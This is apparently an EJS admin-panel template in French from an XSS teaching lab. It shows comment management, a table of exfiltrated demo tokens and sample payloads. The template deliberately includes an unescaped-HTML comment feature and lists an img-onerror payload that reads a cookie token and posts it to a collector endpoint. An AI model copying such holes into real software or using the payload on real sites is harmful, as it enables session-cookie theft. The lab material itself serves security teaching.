<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= title %> - XSS VADI</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <% const currentPage = 'admin'; %>
  <%- include('../partials/navbar') %>

  <!-- Banner -->
  <div class="alert alert-info alert-banner">
    <span class="alert-icon">&#128736;</span>
    <div class="alert-content">
      <p class="alert-message"><strong>PANNEAU ADMINISTRATEUR</strong> - Gestion des commentaires et visualisation des captures</p>
    </div>
  </div>

  <main class="container py-xl">
    <div class="flex justify-between items-center mb-lg">
      <h1>&#128736; Panneau Administrateur</h1>
      <a href="/teacher-guide" class="btn btn-primary">&#128218; Guide Enseignant</a>
    </div>

    <!-- Statistiques -->
    <div class="grid grid-3 mb-xl">
      <div class="card text-center">
        <div class="card-body">
          <div class="score-value text-primary"><%= chapters.length %></div>
          <p class="text-secondary mb-0">Chapitres</p>
        </div>
      </div>
      <div class="card text-center">
        <div class="card-body">
          <div class="score-value text-warning"><%= globalComments.length %></div>
          <p class="text-secondary mb-0">Commentaires globaux</p>
        </div>
      </div>
      <div class="card text-center">
        <div class="card-body">
          <div class="score-value text-danger" id="captureCount"><%= captures.length %></div>
          <p class="text-secondary mb-0">Captures</p>
        </div>
      </div>
    </div>

    <!-- Commentaires globaux -->
    <div class="card card-primary mb-xl">
      <div class="card-header">
        <h4>&#128227; Commentaires globaux</h4>
      </div>
      <div class="card-body">
        <p class="text-secondary mb-lg">Les commentaires globaux apparaissent sur TOUS les chapitres. Utile pour les demonstrations.</p>

        <form method="POST" action="/admin/global-comment" class="mb-lg">
          <div class="form-group">
            <label for="content" class="form-label">Contenu du commentaire :</label>
            <textarea class="form-textarea font-mono" id="content" name="content" rows="4" required placeholder="Entrez votre message (HTML autorise pour demo)..."></textarea>
            <span class="form-hint text-danger">Le contenu sera rendu tel quel (HTML non echappe) - Demo uniquement !</span>
          </div>
          <button type="submit" class="btn btn-primary">&#128228; Publier le commentaire global</button>
        </form>

        <hr>

        <h5 class="mb-md">Commentaires actuels (<%= globalComments.length %>)</h5>
        <% if (globalComments.length === 0) { %>
          <p class="text-muted">Aucun commentaire global pour le moment.</p>
        <% } else { %>
          <% globalComments.forEach(comment => { %>
            <div class="card mb-md">
              <div class="card-body">
                <div class="flex justify-between items-start mb-md">
                  <span class="text-xs text-muted"><%= new Date(comment.timestamp).toLocaleString('fr-FR') %></span>
                  <form method="POST" action="/admin/global-comment/delete/<%= comment.id %>" style="display: inline;">
                    <button type="submit" class="btn btn-sm btn-danger">&#128465; Supprimer</button>
                  </form>
                </div>
                <div class="code-block">
                  <div class="code-block-header">
                    <span class="code-block-lang">Apercu (non execute)</span>
                  </div>
                  <pre><code><%= comment.content %></code></pre>
                </div>
              </div>
            </div>
          <% }) %>
        <% } %>
      </div>
    </div>

    <!-- Captures -->
    <div class="card card-danger mb-xl">
      <div class="card-header">
        <div class="flex justify-between items-center">
          <h4>&#127919; Captures de demoToken</h4>
          <div class="flex gap-sm items-center">
            <button class="btn btn-sm" onclick="toggleAutoRefresh()" id="toggleRefreshBtn">&#9208; Pause</button>
            <% if (captures.length > 0) { %>
              <form method="POST" action="/admin/captures/clear" style="display: inline;">
                <button type="submit" class="btn btn-sm btn-warning">&#128465; Vider</button>
              </form>
            <% } %>
          </div>
        </div>
      </div>
      <div class="card-body">
        <p class="text-secondary mb-lg">Ces captures representent les "demoToken" exfiltres via des payloads XSS. En situation reelle, cela pourrait etre des cookies de session.</p>

        <% if (captures.length === 0) { %>
          <div class="alert alert-info">
            <span class="alert-icon">&#8505;</span>
            <div class="alert-content">
              <p class="alert-title">Aucune capture</p>
              <p class="alert-message">Pour tester l'exfiltration, utilisez un payload XSS dans un chapitre ou publiez un commentaire global avec un script.</p>
            </div>
          </div>
        <% } else { %>
          <div class="table-wrapper" id="capturesTable">
            <table class="table">
              <thead>
                <tr>
                  <th>Date/Heure</th>
                  <th>Type</th>
                  <th>DemoToken</th>
                  <th>Utilisateur</th>
                  <th>Chapitre</th>
                </tr>
              </thead>
              <tbody>
                <% captures.forEach(capture => { %>
                  <tr>
                    <td><%= new Date(capture.timestamp).toLocaleString('fr-FR') %></td>
                    <td>
                      <% if (capture.captureType === 'form') { %>
                        <span class="badge badge-danger">Formulaire</span>
                      <% } else { %>
                        <span class="badge badge-warning">Cookie</span>
                      <% } %>
                    </td>
                    <td><code><%= capture.demoToken %></code></td>
                    <td><strong><%= capture.userName || 'Unknown' %></strong></td>
                    <td><%= capture.chapterId || 'N/A' %></td>
                  </tr>
                <% }) %>
              </tbody>
            </table>
          </div>
        <% } %>
      </div>
    </div>

    <!-- Aide rapide -->
    <div class="card">
      <div class="card-header">
        <h4>&#128161; Aide rapide</h4>
      </div>
      <div class="card-body">
        <div class="grid grid-2 gap-lg">
          <div>
            <h5 class="mb-sm">Tester un payload XSS</h5>
            <p class="text-sm text-secondary">Copiez ce payload dans un commentaire global :</p>
            <div class="code-block">
              <pre><code>&lt;img src="x" onerror="alert('XSS Demo')"&gt;</code></pre>
            </div>
          </div>
          <div>
            <h5 class="mb-sm">Simuler une exfiltration</h5>
            <p class="text-sm text-secondary">Ce payload envoie le demoToken au serveur :</p>
            <div class="code-block">
              <pre><code>&lt;img src="x" onerror="fetch('/api/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoToken:document.cookie.match(/demoToken=([^;]+)/)?.[1],userName:'test'})})"&gt;</code></pre>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>

  <%- include('../partials/footer') %>

  <script src="/js/app.js"></script>
  <script>
    // Auto-refresh des captures
    let currentCaptureCount = <%= captures.length %>;
    let autoRefreshEnabled = true;
    let refreshInterval = null;

    async function refreshCaptures() {
      if (!autoRefreshEnabled) return;

      try {
        const response = await fetch('/admin/api/captures');
        const data = await response.json();

        if (data.success && data.count !== currentCaptureCount) {
          if (data.count > currentCaptureCount) {
            ToastManager.success('Nouvelle capture detectee !', 3000);
          }
          currentCaptureCount = data.count;
          document.getElementById('captureCount').textContent = data.count;

          // Reload pour afficher les nouvelles captures
          setTimeout(() => location.reload(), 1000);
        }
      } catch (error) {
        console.error('Erreur rafraichissement:', error);
      }
    }

    function toggleAutoRefresh() {
      autoRefreshEnabled = !autoRefreshEnabled;
      const btn = document.getElementById('toggleRefreshBtn');

      if (autoRefreshEnabled) {
        btn.innerHTML = '&#9208; Pause';
        startAutoRefresh();
      } else {
        btn.innerHTML = '&#9654; Reprendre';
        stopAutoRefresh();
      }
    }

    function startAutoRefresh() {
      if (refreshInterval) clearInterval(refreshInterval);
      refreshInterval = setInterval(refreshCaptures, 3000);
    }

    function stopAutoRefresh() {
      if (refreshInterval) {
        clearInterval(refreshInterval);
        refreshInterval = null;
      }
    }

    // Demarrer
    startAutoRefresh();
    window.addEventListener('beforeunload', stopAutoRefresh);
  </script>
</body>
</html>
